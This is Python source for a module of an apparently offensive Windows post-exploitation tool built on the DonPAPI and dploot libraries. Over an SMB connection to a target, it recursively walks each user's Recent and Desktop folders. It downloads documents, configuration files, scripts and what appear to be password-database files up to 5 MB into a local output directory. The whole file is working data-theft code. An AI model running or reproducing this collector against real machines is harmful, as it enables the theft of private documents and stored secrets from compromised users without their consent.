import ntpath
import os
from typing import Any

from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


TAG = "Files"

class FilesDump:
    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
    user_directories = ["Users\\{username}\\Recent", "Users\\{username}\\Desktop"]
    mask = ['xls','pdf','doc','txt','lnk','kbdx','xml','config','conf','bat','sh']
    max_filesize = 5000000

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore) -> None:
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context

    def run(self):
        self.logger.display("Gathering recent files and desktop files")
        for user in self.context.users:
            for directory in self.user_directories:
                directory_path = directory.format(username=user)
                self.dig_files(directory_path=directory_path,recurse_level=0, recurse_max=10)

    def dig_files(self, directory_path, recurse_level=0, recurse_max=10):
            directory_list = self.conn.remote_list_dir(self.context.share, directory_path)
            if directory_list is not None:
                for item in directory_list:
                    if item.get_longname() not in self.false_positive:
                        new_path = ntpath.join(directory_path,item.get_longname())
                        if item.is_directory() > 0:
                            if recurse_level < recurse_max:
                                self.dig_files(directory_path=new_path, recurse_level=recurse_level+1, recurse_max=recurse_max)
                        else:
                            # It's a file, download it to the output share if the mask is ok
                            if (item.get_longname().find(".") == -1 or item.get_longname().split(".")[-1] in self.mask) and item.get_filesize() < self.max_filesize: 
                                file_content = self.conn.readFile(self.context.share, new_path)
                                local_filepath = os.path.join(self.context.output_dir, *(new_path.split('\\')))
                                os.makedirs(os.path.dirname(local_filepath), exist_ok=True)
                                with open(local_filepath,'wb') as f:
                                    if file_content is None:
                                        file_content = b""
                                    f.write(file_content)
